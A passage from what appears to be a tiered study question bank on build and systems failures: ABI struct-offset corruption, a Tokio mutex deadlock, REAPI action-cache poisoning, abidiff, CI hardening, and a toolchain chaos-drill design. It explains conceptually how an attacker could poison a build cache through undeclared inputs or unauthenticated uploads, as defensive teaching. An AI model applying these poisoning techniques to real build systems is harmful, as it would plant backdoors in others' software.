> > In the client, `sizeof(struct Order)` is 24 bytes (`id` at 0..7, `price` at 8..15, `quantity` at 16..19, `pad` at 20..23).
> > `s.orders[0]` occupies offsets 0..23.
> > `s.orders[1]` occupies offsets 24..47.
> > Specifically, `s.orders[1].id` is located at offsets 24..31.
> > `s.canary` occupies offsets 48..55.
> > The upgraded shared library was compiled with `client_timestamp` at offset 24!
> > When the DSO executes `orders[0].client_timestamp = 0xDEADBEEF00000000ULL`, it writes 8 bytes starting at `base + 0 * 32 + 24 = offset 24`.
> > Offset 24 is exactly where the client's `s.orders[1].id` resides!
> > Therefore:
> > - `s.orders[1].id` is overwritten and equals `0xDEADBEEF00000000ULL`.
> > - `s.canary` remains `0xCAFEBABE12345678ULL` after index 0 is written, but when `orders[1].client_timestamp` is written at offset `32 + 24 = 56`, it writes past `s.canary` (offsets 48..55) and corrupts adjacent stack variables.

> [!question] L6
> Debug this.
> A high-throughput Rust service built on Tokio freezes under high concurrency.
> CPU usage drops to 0.1%, but incoming HTTP requests time out.
> The developer checks application logs, but there are no errors.
> Inspection of `/proc/<PID>/task/*/stack` reveals 16 threads blocked in a futex wait (the kernel symbol name varies by version), and a user-space backtrace shows each one in `std::sync::Mutex::lock`.
> What is the bug, why did the compiler allow it, and how do you resolve it?
>
> > [!success]- Answer
> > The bug is holding a synchronous `std::sync::MutexGuard` across an `.await` boundary in an asynchronous task.
> > When task A acquires `std::sync::Mutex` and hits an `.await` point (e.g. network I/O or timer), task A is suspended, but the underlying OS worker thread continues executing other tasks.
> > If task B on another worker thread tries to acquire the same `std::sync::Mutex`, that worker thread blocks at the kernel level (`futex`).
> > If task A cannot be scheduled to release the lock because all worker threads are blocked waiting for the mutex, the entire runtime deadlocks.
> > Why the compiler allowed it: `std::sync::MutexGuard` is not `Send`, so `tokio::spawn` rejects a future that holds the guard across `.await`.
> > However, a future that is never required to be `Send` (one run by `block_on`, the `#[tokio::main]` body, or `spawn_local` on a `LocalSet`) compiles without error.
> > Resolution:
> > 1. Use `tokio::sync::Mutex`, which suspends the task without blocking the underlying OS thread.
> > 2. Keep the critical section synchronous and drop the guard before reaching any `.await`:
> >    ```rust
> >    let data = {
> >        let guard = lock.lock().unwrap();
> >        guard.clone()
> >    }; // Guard dropped here
> >    send_async(&data).await;
> >    ```
> > 3. Enable Clippy lint `clippy::await_holding_lock` in CI.

> [!question] L6
> A build cache poisoning attack causes clean CI runners to download a backdoored object file.
> In REAPI v2, what constitutes the `ActionDigest`, and how could an attacker cause an identical `ActionDigest` to return a backdoored object without colliding SHA-256?
>
> > [!success]- Answer
> > In the Remote Execution API v2, the `ActionDigest` is the digest (SHA-256 by default) of the serialized `Action` protobuf message.
> > The `Action` contains:
> > 1. `command_digest`: Hash of the `Command` proto (arguments, environment variables, output file declarations).
> > 2. `input_root_digest`: Hash of the root `Directory` proto (Merkle tree of declared input files and hashes).
> > 3. `timeout`, `do_not_cache`, `salt`, and `platform`, which also feed the key.
> > An attacker cannot break SHA-256; instead, the attack exploits undeclared inputs or unhardened worker environments:
> > 1. Undeclared Dependency:
> > If `engine.c` includes `/tmp/config.h` or an unversioned `/usr/local/include/header.h`, that file is NOT in the `input_root_digest` Merkle tree.
> > A malicious worker with a compromised `/tmp/config.h` executes the compiler, produces a backdoored `engine.o`, and uploads the result to the Action Cache under the clean `ActionDigest`.
> > 2. Nondeterministic Compiler Macros:
> > Code containing `__DATE__`, `__TIME__`, or reading `/dev/urandom` produces different binaries for identical input Merkle roots.
> > 3. Unauthenticated Action Cache Uploads:
> > If developer workstations or untrusted CI branches have write permissions (`UpdateActionResult`) to the shared Action Cache without cryptographic builder signing, an attacker can simply upload a poisoned `ActionResult` mapped to any target `ActionDigest`.

> [!question] L7
> How does `libabigail` (`abidiff`) detect ABI breaks between two shared library ELF binaries without source code, and what are its fundamental limitations?
>
> > [!success]- Answer
> > `abidiff` parses the DWARF debugging information (`.debug_info`, `.debug_types`, `.debug_str`) and ELF symbol tables (`.symtab`, `.dynsym`) of both shared libraries:
> > 1. It constructs an internal representation (an ABI corpus) of every exported type, function signature, struct layout, enum, and global variable.
> > 2. It compares the two trees: detecting struct member additions, removals, offset shifts, size changes, vtable layout modifications, and calling convention attribute drift.
> > 3. It correlates type changes with the ELF dynamic symbol table to determine whether an affected type is part of a publicly exported function signature.
> > Limitations:
> > 1. DWARF Requirement:
> > It requires type information: DWARF (`-g`), or CTF or BTF with `--ctf` or `--btf`.
> > Without it, abidiff compares only ELF symbols and reports their addition or removal, so a stripped binary without separate debug info hides layout changes.
> > 2. Opaque Pointers and Void*:
> > If an interface passes untyped memory buffers (`void*`) or incomplete struct pointers whose definitions are hidden across compilation boundaries, `abidiff` cannot inspect internal layout changes unless explicitly guided by suppression or type specifications.
> > 3. Inline Functions and Templates:
> > If an inline function in a header expands at the call site in client code, changing the inline function body without changing exported symbols will not be caught if neither DSO exports that symbol.

> [!question] L7
> Design an enterprise-grade automated CI gating system that prevents both supply-chain build script exfiltration and remote action cache poisoning across 5,000 developers.
>
> > [!success]- Answer
> > The architecture requires four decoupled defensive perimeters:
> > 1. Network Namespace Isolation for Build Steps:
> >    - All build steps (`cargo build`, `pip install`, `bazel build`) execute inside dedicated Linux network namespaces (`unshare -n`) with loopback only.
> >    - All dependencies must be pre-fetched during an audited `fetch` phase through an internal quarantine caching proxy.
> > 2. Strict Credential Scoping:
> >    - Zero long-lived cloud or GitHub secrets are injected into build containers.
> >    - Deployment and publishing occur in dedicated stages guarded by OpenID Connect (OIDC) identity tokens and Sigstore Cosign signatures.
> > 3. Cryptographically Signed Action Cache:
> >    - Remote Execution Action Cache enforces mutual TLS (mTLS).
> >    - Only ephemeral, hardened execution workers inside the isolated cluster possess signing keys to write `ActionResult` entries.
> >    - Developer workstations operate with `--remote_upload_local_results=false`.
> > 4. Hermetic Toolchains and Pre-Merge ABI Verification:
> >    - All compilers execute inside pinned container sysroots (`-nostdinc`, `--sysroot`, `-fdebug-prefix-map`).
> >    - Every pull request touching shared libraries executes `abidiff --leaf-changes-only` against the latest production release tag, failing the build on unbumped SONAME struct shifts.

> [!question] L8+
> A distinguished engineer is tasked with building a company-wide "Disaster Recovery GameDay" simulation framework that automatically injects realistic toolchain corruptions into staging pipelines.
> What failure modes must the simulator generate, what telemetry must prove detection, and what guardrails prevent blast-radius leakage into production?
>
> > [!success]- Answer
> > The simulation platform (Chaos Toolchain Simulator) must model the full spectrum of developer infrastructure failure modes:
> > 1. Injection Matrix:
> >    - Build Layer: Inject action digest bit-flips, non-deterministic preprocessor timestamps (`__TIME__`), and missing header Merkle leaves.
> >    - Dynamic Linker Layer: Introduce struct member padding shifts, vtable reordering, and `DT_RUNPATH` vs `DT_RPATH` interpositions.
> >    - Supply Chain Layer: Introduce simulated typosquatted transitive crates containing harmless egress probes to canary endpoints.
> >    - Storage Layer: Truncate Git loose objects and flip bytes in packfile index headers.
> > 2. Verification Telemetry:
> >    - The framework measures Time to Detection (TTD) and Time to Remediation (TTR) against automated SRE runbooks.
> >    - Metrics include event loop lag gauges, eBPF network connect alerts, compiler warning flags, and `git fsck` exit codes.
> > 3. Blast-Radius Guardrails:
> >    - Cryptographic Partitioning: Simulation targets must use isolated, ephemeral repository forks and sandboxed CAS namespaces (`instance_name: "gameday-sandbox"`).
> >    - Air-Gapped Network Enclaves: Synthetic exfiltration payloads target strictly mocked internal honeypot DNS servers.
> >    - Automatic Teardown: All injected artifacts expire automatically via TTL in cache backends, preventing poisoned artifacts from persisting.

---

## Further Reading

- The Bazel Authors, Remote Execution API v2 (REAPI), https://github.com/bazelbuild/remote-apis.
  Defines `Action`, `Command`, `Directory`, and the Content Addressable Storage protocol.
- The SLSA Authors, Supply-chain Levels for Software Artifacts (SLSA) Specification v1.2, https://slsa.dev/spec/v1.2/.
  Defines cryptographic provenance and build-integrity requirements across modern release pipelines.
- Ulrich Drepper, How To Write Shared Libraries, https://www.akkadia.org/drepper/dsohowto.pdf.
  The definitive treatise on ELF dynamic linking, symbol visibility, and library versioning.
- Michael Matz et al., System V Application Binary Interface: AMD64 Architecture Processor Supplement, https://gitlab.com/x86-psABIs/x86-64-ABI.
  Specifies struct alignment, stack frame padding, and calling conventions for x86_64 systems.
- Dodji Seketeli, Libabigail: The ABI Generic Analysis and Instrumentation Library, https://sourceware.org/libabigail/manual/abidiff.html.
  Documentation for `abidiff` and static ELF DWARF ABI change detection.
- Linux man-pages project, ld.so(8): Dynamic Linker/Loader, https://man7.org/linux/man-pages/man8/ld.so.8.html.
  Authoritative specification of shared library search orders across `DT_RPATH`, `LD_LIBRARY_PATH`, and `DT_RUNPATH`.
- Tokio Project, tokio-console, https://github.com/tokio-rs/console.
  Real-time diagnostic observability and lost-waker detection for asynchronous Rust applications.
- Scott Chacon and Ben Straub, Pro Git, 2nd Edition (Chapter 10: Git Internals), https://git-scm.com/book/en/v2/Git-Internals-Git-Objects.
  Covers the format of loose objects, packfiles, and content addressing in Git.
- Git Community, git-fsck(1) and git-index-pack(1), https://git-scm.com/docs.
  Official documentation for validating object database connectivity and reconstructing packfile indices.

---

## Related

- Prerequisites: [[Cross-Pillar-Debugging-Scenario-Bank]], [[Diagnose-Dynamic-Linker-and-ABI-Failures]], [[Respond-to-a-Compromised-Transitive-Dependency]]
- Next: [[Capstone-Mini-Git-in-Rust]]
- See also: [[14-Low-Latency-Systems/13 - Reliability, Ops & Testing/Deterministic Replay and Packet Injection Testing|Deterministic Replay and Packet Injection Testing]], [[17-Cloud-AI-Engineering/Volume_07_Reliability_and_SRE/README|README]]
- Lab: `code/11-Arena-and-Capstones/incident_sim_drills/` (requires: linux)
